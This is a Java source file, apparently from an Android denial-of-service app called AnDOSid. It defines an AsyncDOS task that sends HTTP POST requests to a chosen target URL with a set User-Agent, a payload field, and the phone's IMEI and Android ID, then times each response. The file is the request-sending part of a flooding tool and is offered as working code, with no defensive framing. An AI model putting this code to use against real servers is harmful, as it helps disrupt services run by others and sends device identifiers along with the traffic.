package com.scott.herbert.AnDOSid;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.os.AsyncTask;
import android.os.SystemClock;
import android.util.Log;

class AsyncDOS extends AsyncTask<DOSdata, Integer, Long> {

	private static String KEY = "AsyncDOS";
	
	protected Long doInBackground(DOSdata... params) {
   
			long startTime;
			long endTime;
		
			Log.d(KEY, "in doinBackground");
			
	        HttpClient httpclient = new DefaultHttpClient();
	        Log.d(KEY, "set httpclient");
	        HttpPost httppost = new HttpPost(params[0].getTarget());
	        Log.d(KEY, "set httppost");
	        httppost.setHeader("User-Agent", params[0].getHttpUserAgent());
	        Log.d(KEY, "set UserAgent");
	        try {
	            // Add your data
	            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(3);
	            nameValuePairs.add(new BasicNameValuePair("IMEI", params[0].getIMEI()));
	            nameValuePairs.add(new BasicNameValuePair("AndroidId", params[0].getAndroidId()));
	            nameValuePairs.add(new BasicNameValuePair("payload", params[0].getPayload()));
	            httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
	            
	            startTime = SystemClock.elapsedRealtime();
	             httpclient.execute(httppost);
	            endTime = SystemClock.elapsedRealtime();
	            
	        } catch (ClientProtocolException e) {
	            // TODO Auto-generated catch block
	        	startTime = (long) 0;
	        	endTime = (long) 0;
	        } catch (IOException e) {
	            // TODO Auto-generated catch block
	        	startTime = (long) 0;
	        	endTime = (long) 0;
	        }

		// CAN'T Speak to UI thread
	        if (endTime<startTime){
	        	return (long) 0;
	        } else {
	        	return endTime - startTime;
	        }
        }

    protected void onProgressUpdate(Integer... progress) {
        // Can speak to UI thread
    }

    protected void onPostExecute(Long time) {
    	// Can speak to UI thread
    }


}
